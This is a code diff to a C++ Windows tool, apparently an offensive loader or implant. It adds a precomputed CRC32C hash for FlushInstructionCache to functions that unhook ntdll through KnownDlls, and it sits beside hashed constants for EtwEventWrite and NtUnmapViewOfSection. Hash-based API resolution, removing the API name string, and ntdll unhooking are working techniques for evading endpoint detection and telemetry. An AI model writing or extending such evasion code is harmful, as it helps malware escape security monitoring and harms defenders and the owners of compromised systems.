@@ -31,6 +31,9 @@ constexpr DWORD HASH_NtUnmapViewOfSection = 0x595014ad;
 constexpr DWORD HASH_NtClose              = 0x8b8e133d;
 constexpr DWORD HASH_EtwEventWrite        = 0x24a8d022;
 
+// ─── CRC32C Hash Constants (for ApiResolver) ───
+static constexpr DWORD HASH_FlushInstructionCache = 0x0AC925B5;
+
 // ─── NT Status Codes ───
 #ifndef STATUS_SUCCESS
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
@@ -346,7 +349,7 @@ bool KnownDlls::UnhookNtdll()
         HMODULE hK32f = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         if (hK32f) {
             auto pFIC = (BOOL(WINAPI*)(HANDLE,LPCVOID,SIZE_T))
-                Api::GetProcByHashCrc(hK32f, Crc32C::ConstHash("FlushInstructionCache"));
+                Api::GetProcByHashCrc(hK32f, HASH_FlushInstructionCache);
             if (pFIC) pFIC((HANDLE)(LONG_PTR)-1, NULL, 0);
         }
     }
@@ -458,7 +461,7 @@ bool KnownDlls::MiniUnhookForTls()
         HMODULE hK32f = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         if (hK32f) {
             auto pFIC = (BOOL(WINAPI*)(HANDLE,LPCVOID,SIZE_T))
-                Api::GetProcByHashCrc(hK32f, Crc32C::ConstHash("FlushInstructionCache"));
+                Api::GetProcByHashCrc(hK32f, HASH_FlushInstructionCache);
             if (pFIC) pFIC((HANDLE)(LONG_PTR)-1, NULL, 0);
         }
     }
